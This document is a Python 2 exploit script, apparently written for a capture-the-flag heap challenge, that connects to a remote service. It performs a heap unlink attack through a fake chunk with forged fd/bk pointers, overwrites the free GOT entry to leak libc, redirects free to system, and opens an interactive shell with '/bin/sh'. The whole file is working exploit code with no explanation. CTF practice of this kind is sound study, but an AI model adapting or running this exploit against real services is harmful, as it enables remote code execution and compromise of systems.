from zio import *

#io = zio('./heap')
io  = zio(('121.40.56.102',9733), print_read=NONE, print_write=NONE)

def Init_message(length):
	io.read_until("Choice:")
	io.writeline('1')
	io.read_until("Input the message length:")
	io.writeline(str(length))


def Set_message(index,data):
	io.read_until("Choice:")
	io.writelines('2')
	io.read_until("Input the message index:")
	io.writeline(str(index))
	io.read_until("Input the message content:")
	io.writeline(data)

def Delete_message(index):
	io.read_until("Choice:")
	io.writelines('3')
	io.read_until("Input the message index:")
	io.writeline(str(index))


[Init_message(0x100-8) for i in xrange(4)]

ptr = 0x6020d0
fd  = ptr - 0x8*3
bk  = ptr - 0x8*2
payload  = ''
payload += l64(0) + l64(0x111) + l64(fd) + l64(bk) + 'A'*(0x100-6*8) + l64(0xf0)

Set_message(1, payload)
Set_message(3, '/bin/sh\x00')

#raw_input()
Delete_message(2)

free_got = 0x000000602018
puts_got = 0x000000602020
payload  = l64(0) + l64(free_got) + l64(0xf8) + l64(puts_got) + l64(0xf8) + l64(free_got) + l64(0xf8)[:-1]
Set_message(1, payload)

puts_plt = 0x4006c0
payload = l64(puts_plt)[:-1]
Set_message(0, payload)
Delete_message(1)
data = l64(io.read(6) + "\x00\x00")

system = data - 0x6fd60 + 0x46590
payload = l64(system)[:-1]
Set_message(0, payload)

Delete_message(3)
print "[+]Got shell"
io.interact()
